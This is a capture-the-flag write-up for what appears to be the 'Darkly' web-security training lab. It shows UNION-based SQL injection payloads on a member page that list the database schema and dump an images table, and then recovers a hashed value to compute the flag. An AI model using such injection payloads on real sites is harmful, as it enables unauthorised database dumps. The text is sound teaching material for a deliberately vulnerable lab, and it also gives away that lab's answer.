# SQLI images

From /?page=member we have an sql injection where we can dump all the db.

Get informations about tables:

```
42 UNION ALL SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES

Database: Member_Brute_Force
Table: db_default

Database: Member_Sql_Injection
Table: users

Database: Member_guestbook
Table: guestbook

Database: Member_images
Table: list_images

Database: Member_survey
Table: vote_dbs
```

Get informations about column name:

```
42 UNION ALL SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS

First name: db_default
Surname : id

First name: db_default
Surname : username

First name: db_default
Surname : password

First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

First name: guestbook
Surname : id_comment

First name: guestbook
Surname : comment

First name: guestbook
Surname : name

First name: list_images
Surname : id

First name: list_images
Surname : url

First name: list_images
Surname : title

First name: list_images
Surname : comment

First name: vote_dbs
Surname : id_vote

First name: vote_dbs
Surname : vote

First name: vote_dbs
Surname : nb_vote

First name: vote_dbs
Surname : subject
```

Dump the list_images table;

```
42 UNION ALL SELECT CONCAT(ID, 0x0A, URL, 0x0A, TITLE, 0x0A, COMMENT), 42 FROM Member_images.list_images

First name: 1
https://fr.wikipedia.org/wiki/Programme_
Nsa
An image about the NSA !

First name: 2
https://fr.wikipedia.org/wiki/Fichier:42
42 !
There is a number..

First name: 3
https://fr.wikipedia.org/wiki/Logo_de_Go
Google
Google it !

First name: 4
https://en.wikipedia.org/wiki/Earth#/med
Earth
Earth!

First name: 5
borntosec.ddns.net/images.png
Hack me ?
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Then brute force an encryp to get the flag:

```
md5(1928e8083cf461a51303633093573c46) = albatroz
sha256(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```
